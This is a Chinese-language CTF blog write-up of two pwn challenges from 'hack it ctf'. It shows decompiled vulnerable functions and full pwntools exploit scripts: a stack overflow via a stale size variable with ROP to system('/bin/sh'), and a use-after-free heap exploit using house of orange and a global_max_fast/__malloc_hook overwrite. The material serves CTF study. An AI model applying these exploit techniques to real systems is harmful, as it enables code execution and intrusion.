---
title: hack it ctf
date: 2018-10-06 00:00:00
categories:
- CTF/Pwn
tags:  Pwn
---

## 1.army

还以为是个堆题目，想多了

三个功能，加入军队，显示信息，升级（delete）
漏洞点在于加入军队和升级，全局变量magic那里
```
    unsigned int sub_4007E7()
    {
      unsigned int result; // eax
      int v1; // eax
      int v2; // eax
      char nptr; // [rsp+0h] [rbp-30h]
      void *des; // [rsp+8h] [rbp-28h]
      void *answer; // [rsp+10h] [rbp-20h]
      int answer_size; // [rsp+1Ch] [rbp-14h]
      void *name; // [rsp+20h] [rbp-10h]
      struct soldier *ptr; // [rsp+28h] [rbp-8h]
    
      if ( flag == 1 )
        return puts("Already created soldier");
      ptr = (struct soldier *)malloc(0x20uLL);
      if ( !ptr )
        return puts("Malloc error");
      flag = 1;
      struct = (__int64)ptr;
      printf("Enter name: ");
      name = malloc(0x28uLL);
      read(0, name, 0x23uLL);
      printf("Enter height: ", name);
      read(0, &nptr, 4uLL);
      v1 = atoi(&nptr);
      ptr->height = v1;
      printf("Enter weight: ", &nptr);
      read(0, &nptr, 4uLL);
      v2 = atoi(&nptr);
      ptr->weight = v2;
      ptr->name = (__int64)name;
      printf("Enter length of answer: ", &nptr);
      read(0, &nptr, 4uLL);
      answer_size = atoi(&nptr);
      answer = malloc(answer_size);
      if ( !answer )
        return puts("Malloc error");
      printf("Enter your description: ", &nptr);
      des = malloc(answer_size);
      read(0, des, answer_size);
      ptr->description = (__int64)des;
      ptr->answer_size = answer_size;
      result = (unsigned __int8)(((unsigned __int64)ptr->answer_size >> 56) + ptr->answer_size)
             - ((unsigned int)(ptr->answer_size >> 31) >> 24);
      magic = ptr->answer_size;
      return result;
    }
```
magic正常是保存soldier结构体的answersize，但是如果我们没有申请成功的话，全局变量不会被更新
```
    signed __int64 delete()
    {
      int size; // eax
      void *v2; // rsp
      __int64 v3; // [rsp+0h] [rbp-30h]
      int v4; // [rsp+Ch] [rbp-24h]
      void *buf; // [rsp+10h] [rbp-20h]
      __int64 size_local; // [rsp+18h] [rbp-18h]
    
      if ( !flag )
        return 0LL;
      size = struct->answer_size;
      size_local = size - 1LL;
      v2 = alloca(16 * ((size + 15LL) / 0x10uLL));
      buf = &v3;
      printf("Enter your answer : ", size, (size + 15LL) % 0x10uLL, 16LL, size, 0LL);
      v4 = magic;
      read(0, buf, magic);
      puts("So trolled man, Imma demote you. Now you will be junior to your friends hahahaha so embarrasing.");
      free((void *)struct->name);
      free((void *)struct->description);
      struct->name = 0LL;
      struct->description = 0LL;
      struct->height = 0;
      struct->weight = 0;
      struct->answer_size = 0;
      struct = 0LL;
      flag = 0;
      return 1LL;
    }
```
在delete函数里边，会根据magic来alloca一个内存
这里贴一下alloca函数

    内存分配函数,与malloc,calloc,realloc类似.
    但是注意一个重要的区别,_alloca是在栈(stack)上申请空间,用完马上就释放.

这样我们delete掉士兵之后，再次申请一个士兵，让他的size不合法，这样magic不会更新，alloca的时候会alloca 0字节的空间，这样就可以达到栈溢出目的
至于泄露地址，程序开始会打印出puts函数的地址
然后rop一把梭：
```
    from pwn import * 
    #context.log_level = 'debug'
    
    io = process('./army')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    def add(n,w,h,s,d,t = False):
    	io.recvuntil('promotion\n')
    	io.sendline('1')
    	io.recvuntil(':')
    	io.sendline(n)
    	io.recvuntil(':')
    	io.sendline(str(w))
    	io.recvuntil(':')
    	io.sendline(str(h))
    	io.recvuntil(':')
    	io.sendline(str(s))
    	if t:
    		io.recvuntil(':')
    		io.sendline(d)
    def delete(a):
    	io.recvuntil('promotion\n')
    	io.sendline('3')
    	io.recvuntil(':')
    	io.sendline(a)
    
    io.recvuntil('Luck : ')
    leak = u64(io.recvline()[:8].rstrip('\n').ljust(8,'\x00'))
    libc_base = leak - libc.symbols['puts']
    pop_rdi = 0x400d03
    bin_sh = next(libc.search('/bin/sh')) + libc_base
    sys = libc_base + libc.symbols['system']
    log.success(hex(leak))
    log.success(hex(bin_sh))
    log.success(hex(sys))
    
    add('secunda',1,1,0x50,'oooooo',t = True)
    delete('aaaa')
    add('nirn',1,1,-1,'sss')
    payload = 'A'*0x38 + p64(pop_rdi) + p64(bin_sh) + p64(sys)
    delete(payload)
    io.interactive()
```
## 2.heapint
```
ssize_t enter_name()
{
  printf("Enter name :");
  return read(0, &name, 0x20uLL);               // can leak
}
```
这里可以leak地址
```
__int64 add()
{
  __int64 result; // rax
  void *ptr; // rax
  unsigned int v2; // [rsp+0h] [rbp-10h]
  size_t size; // [rsp+4h] [rbp-Ch]

  printf("Enter size of chunk :");
  __isoc99_scanf("%d", &size);
  if ( (unsigned int)size <= 0x20000 && (unsigned int)size > 0x7F )
  {
    printf("Enter index :", &size);
    __isoc99_scanf("%d", &v2);
    if ( v2 <= 0x13 )
    {
      ptr = malloc((unsigned int)size);
      *(size_t *)((char *)&size + 4) = (size_t)ptr;
      unk_202120[v2] = ptr;
      sizelst[v2] = (unsigned int)size;
      result = *(size_t *)((char *)&size + 4);  // ptr
    }
    else
    {
      puts("Invalid index");
      result = 0LL;
    }
  }
  else
  {
    puts("\nInvalid size");
    result = 0LL;
  }
  return result;
}
```
输入大小限制，不能利用fastbin
```
void delete()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  printf("\nEnter index :");
  __isoc99_scanf("%d", &v0);
  if ( v0 <= 0x13 )
    free((void *)unk_202120[v0]);               // uaf
}
```
明显的uaf
### 分析
泄露地址那里只能泄露一个堆地址，刚开始想的是house of roman，但是好像行不通
换了一个思路，伪造一个位于main_arena的堆块来泄露地址
### leak
首先在fb[2],fb[3]那里构造两个堆块，使其成为伪造堆块的fd与bk指针
```  
  add(0x80,0)
  add(0x180,1)
  delete(0)
  delete(1)
  add(0x90,0)
  add(0x80,2)
  delete(0)
  delete(2)
  # 1-> 0a0 2->0b0
  add(0x1f0,0)
  #
  add(0x80,3)
  add(0x180,4)
  delete(3)
  delete(4)
  add(0x90,3)
  add(0x80,5)
  delete(3)
  delete(5)
  #3 -> 210 4->2a0 5->2b0
  edit(1,p64(0) + p64(0x41) + 'A'*0x38 + p64(0x41))
  edit(4,p64(0) + p64(0x51) + 'B'*0x48 + p64(0x51))
  delete(2)
  delete(5)
```
unsortedbin里面保存了main_arena的地址，我们可以通过局部写控制其fdbk指针指向
这样就可以另:
fakechunk->fd->bk = &fakechunk
fakechunk->bk->fd = &fakechunk
然后给他搞到samllbin里面去
```
  #fb[2] 0a0
  #fb[3] 2a0
  edit(4,p64(0) + p64(0x91) + 'C'*0x88 + p64(0x21) + 'D'*0x18 + p64(0x21))
  delete(5)
  add(0x80,6)
  edit(5,chr(0x28))
  #5,6 ptr is same, point to 2b0, its fd piont to fb[0]
  edit(1,p64(0)+p64(0x91)+'D'*0x88+p64(0x21)+'E'*0x18 + p64(0x21))
  delete(2)
  add(0x100,7)
  #make 2 insert into small bin
  edit(2,p64(1)+chr(0x28))
  #
  add(0x80,8)#0a0
  add(0x80,0)
```
这样就可以申请到一个main_arena的堆块了，打印地址就可以leak了
### getshell
用了两种方法
#### 1.house of orange
```
  fake_file = p64(0)
  fake_file += p64(0x61)
  fake_file += p64(1)
  fake_file += p64(IO_list_all- 0x10)
  fake_file += p64(2) + p64(3)
  fake_file += "\x00" * 8
  fake_file += p64(libc_base + next(libc.search('/bin/sh\x00'))) #/bin/sh addr
  fake_file += (0xc0-0x40) * "\x00"
  fake_file += p32(0) #mode
  fake_file += (0xd8-0xc4) * "\x00"
  fake_file += p64(libc_base + 0x3c37b0 - 0x18) #vtable_addr
  fake_file += (0xe8-0xe0) * "\x00"
  fake_file += p64(system_addr)
  add(0x90,9)
  add(0x100,11)
  add(0x100,14)
  delete(9)
  delete(11)
  add(0xa0,10)
  add(0xf0,12)
  add(0x90,13)
  delete(12)
  edit(11,fake_file)
  add(400,15)
```
#### 2.modify max_fast hijack topchunk
```
  one = libc_base + 0xf02a4
  mlh = libc_base + libc.symbols['__malloc_hook']
  global_max_fast = 0x3c67f8 + libc_base
  add(0xb0,9)
  add(0xe0,10)
  add(0xd0,11)
  add(0x100,12)
  delete(10)
  edit(10,p64(global_max_fast - 0x10)+p64(global_max_fast - 0x10))
  add(0xe0,10)
  delete(9)
  edit(9,p64(mlh-0x10)+p64(mlh-0x10))
  add(0xb0,9)
  delete(10)
  edit(10,p64(mlh + 0x10 + 0x58)+p64(mlh + 0x10 + 0x58))
  add(0xe0,10)
  delete(11)
  edit(11,p64(mlh + 0x10 + 0x58)+p64(mlh + 0x10 + 0x58))
  add(0xd0,11)
  add(0x90,13)
  edit(13,p64(one)*4)
  delete(9)
  delete(9)
```
### 完整exp
```
from pwn import *
context.log_level = 'debug'

io = process('./heap_interface')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def p():
  gdb.attach(io)
  raw_input()
def add(size,idx):
  io.recvuntil('Show info')
  io.sendline('1')
  io.recvuntil(':')
  io.sendline(str(size))
  io.recvuntil(':')
  io.sendline(str(idx))
def edit(idx,content):
  io.recvuntil('Show info')
  io.sendline('2')
  io.recvuntil(':')
  io.sendline(str(idx))
  io.recvuntil(':')
  io.send(content)
def delete(idx):
  io.recvuntil('Show info')
  io.sendline('3')
  io.recvuntil(':')
  io.sendline(str(idx))

def main():
  io.recvuntil(':')
  io.send('A'*0x20)
  io.recvuntil('Show info')
  io.sendline('4')
  io.recv(0x20)
  leak = u64(io.recv(6).ljust(8,'\x00'))
  heapbase = leak - 0x10
  delete(0)

  add(0x80,0)
  add(0x180,1)
  delete(0)
  delete(1)
  add(0x90,0)
  add(0x80,2)
  delete(0)
  delete(2)
  # 1-> 0a0 2->0b0
  add(0x1f0,0)
  #
  add(0x80,3)
  add(0x180,4)
  delete(3)
  delete(4)
  add(0x90,3)
  add(0x80,5)
  delete(3)
  delete(5)
  #3 -> 210 4->2a0 5->2b0
  edit(1,p64(0) + p64(0x41) + 'A'*0x38 + p64(0x41))
  edit(4,p64(0) + p64(0x51) + 'B'*0x48 + p64(0x51))
  delete(2)
  delete(5)
  #fb[2] 0a0
  #fb[3] 2a0
  edit(4,p64(0) + p64(0x91) + 'C'*0x88 + p64(0x21) + 'D'*0x18 + p64(0x21))
  delete(5)
  add(0x80,6)
  edit(5,chr(0x28))
  #5,6 ptr is same, point to 2b0, its fd piont to fb[0]
  edit(1,p64(0)+p64(0x91)+'D'*0x88+p64(0x21)+'E'*0x18 + p64(0x21))
  delete(2)
  add(0x100,7)
  #make 2 insert into small bin
  edit(2,p64(1)+chr(0x28))
  #
  add(0x80,8)#0a0
  add(0x80,0)
  io.recvuntil('Show info')
  io.sendline('4')
  io.recvuntil('A'*0x20)
  leak = u64(io.recv(6).ljust(8,'\x00'))
  log.success(hex(leak))
  libc_base = leak - 24 - 0x10 - libc.symbols['__malloc_hook']
  IO_list_all = libc_base + libc.symbols['_IO_list_all']
  system_addr = libc_base + libc.symbols['system']
  log.success(hex(libc_base))
  #_____________house of orange______
  """
  fake_file = p64(0)
  fake_file += p64(0x61)
  fake_file += p64(1)
  fake_file += p64(IO_list_all- 0x10)
  fake_file += p64(2) + p64(3)
  fake_file += "\x00" * 8
  fake_file += p64(libc_base + next(libc.search('/bin/sh\x00'))) #/bin/sh addr
  fake_file += (0xc0-0x40) * "\x00"
  fake_file += p32(0) #mode
  fake_file += (0xd8-0xc4) * "\x00"
  fake_file += p64(libc_base + 0x3c37b0 - 0x18) #vtable_addr
  fake_file += (0xe8-0xe0) * "\x00"
  fake_file += p64(system_addr)
  add(0x90,9)
  add(0x100,11)
  add(0x100,14)
  delete(9)
  delete(11)
  add(0xa0,10)
  add(0xf0,12)
  add(0x90,13)
  delete(12)
  edit(11,fake_file)
  add(400,15)
  """
  #---------maxfast-------
  one = libc_base + 0xf02a4
  mlh = libc_base + libc.symbols['__malloc_hook']
  global_max_fast = 0x3c67f8 + libc_base
  add(0xb0,9)
  add(0xe0,10)
  add(0xd0,11)
  add(0x100,12)
  delete(10)
  edit(10,p64(global_max_fast - 0x10)+p64(global_max_fast - 0x10))
  add(0xe0,10)
  delete(9)
  edit(9,p64(mlh-0x10)+p64(mlh-0x10))
  add(0xb0,9)
  delete(10)
  edit(10,p64(mlh + 0x10 + 0x58)+p64(mlh + 0x10 + 0x58))
  add(0xe0,10)
  delete(11)
  edit(11,p64(mlh + 0x10 + 0x58)+p64(mlh + 0x10 + 0x58))
  add(0xd0,11)
  add(0x90,13)
  edit(13,p64(one)*4)
  delete(9)
  delete(9)
  io.interactive()
if __name__ == '__main__':
  main()
```